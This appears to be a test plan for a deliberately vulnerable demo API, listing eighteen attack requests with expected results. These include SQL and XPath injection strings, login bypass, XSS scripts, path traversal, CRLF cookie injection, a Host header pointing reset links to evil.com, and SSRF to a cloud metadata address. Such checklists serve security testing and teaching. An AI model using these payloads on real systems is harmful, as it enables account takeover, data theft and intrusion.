@@ -1,0 +1,132 @@
+
+1. SQL Injection — TodoController Search
+GET /api/Todo/search
+keyword = ' OR '1'='1
+category =
+Expected: Returns ALL todos — proves injection ✅
+
+2. XSS — Todo Preview
+First POST /api/Todo with:
+{
+  "title": "Test",
+  "description": "<script>alert('XSS!')</script>",
+  "priority": "High",
+  "category": "Work",
+  "createdBy": "admin"
+}
+
+Then GET /api/Todo/1/preview
+Expected: Open URL in browser → alert popup appears ✅
+
+3. IDOR — View Any Todo
+GET /api/Todo/1  → john's todo
+GET /api/Todo/2  → admin's todo
+Expected: Any user can see any todo without auth ✅
+
+4. SQL Injection in Login — AuthController
+POST /api/Auth/login
+{
+  "username": "admin' OR '1'='1' --",
+  "password": "anything"
+}
+Expected: Login succeeds without real password ✅
+
+5. Plaintext Password Storage
+POST /api/Auth/register
+{
+  "username": "hacker",
+  "password": "mypassword123",
+  "email": "h@h.com",
+  "role": "Admin"
+}
+
+Then GET /api/User/list
+Expected: Password visible as plaintext in list ✅
+Also proves: User set own role as Admin ✅
+
+6. User Enumeration — Forgot Password
+POST /api/Auth/forgot-password
+"admin@company.com"
+
+POST /api/Auth/forgot-password
+"notexist@test.com"
+Expected: Different messages reveal which email exists ✅
+
+7. Host Header Injection
+POST /api/Auth/forgot-password
+Header: Host: evil.com
+Body: "admin@company.com"
+Expected: Reset link points to evil.com ✅
+
+8. Weak 3DES Encryption
+GET /api/Auth/encrypt?data=SensitivePassword
+Expected: Returns encrypted data with algorithm=3DES ✅
+
+9. Path Traversal — Attachment
+GET /api/Attachment/download?fileName=../../Program.cs
+GET /api/Attachment/download?fileName=../../VulnDemo.Api.csproj
+Expected: Returns internal file contents ✅     
+
+10. Header Manipulation
+GET /api/Attachment/export?fileName=todos.csv%0d%0aSet-Cookie:%20session=hijacked
+Expected: Response header contains injected cookie ✅       
+
+11. Unrestricted File Upload
+POST /api/Attachment/upload
+{
+  "fileName": "malware.exe",
+  "content": "malicious content"
+}
+Expected: File accepted without restriction ✅  
+
+
+12. Stack Trace Exposure
+GET /api/Attachment/view/nonexistent.txt
+Expected: Full stack trace returned in response ✅
+
+3. Mass Assignment — User Profile
+PUT /api/User/profile
+{
+  "id": 2,
+  "username": "john",
+  "email": "john@test.com",
+  "role": "Admin",
+  "isAdmin": true,
+  "creditLimit": 999999
+}
+Expected: Role updated to Admin ✅
+
+14. Broken Access Control
+DELETE /api/User/1
+Header: role = Admin
+Expected: Deletes user just by setting header ✅
+
+15. SSRF — Webhook
+POST /api/User/notify-webhook
+{
+  "id": 1,
+  "username": "john",
+  "email": "j@j.com",
+  "role": "User",
+  "notificationWebhook": "http://169.254.169.254/metadata"
+}
+Expected: Server tries to call Azure metadata endpoint ✅
+
+6. XPath Injection — Preferences
+GET /api/User/preferences?username=' or '1'='1
+Expected: Returns ALL users including API keys ✅
+
+17. Debug Endpoint
+GET /api/User/debug
+Expected: Returns connection strings, env vars, server info ✅
+
+18. Stored XSS — Comments
+POST /api/Comment
+{
+  "todoId": 1,
+  "userId": 1,
+  "content": "<script>alert('Stored XSS!')</script>"
+}
+
+Then GET /api/Comment/todo/1
+Expected: Script stored and returned raw ✅
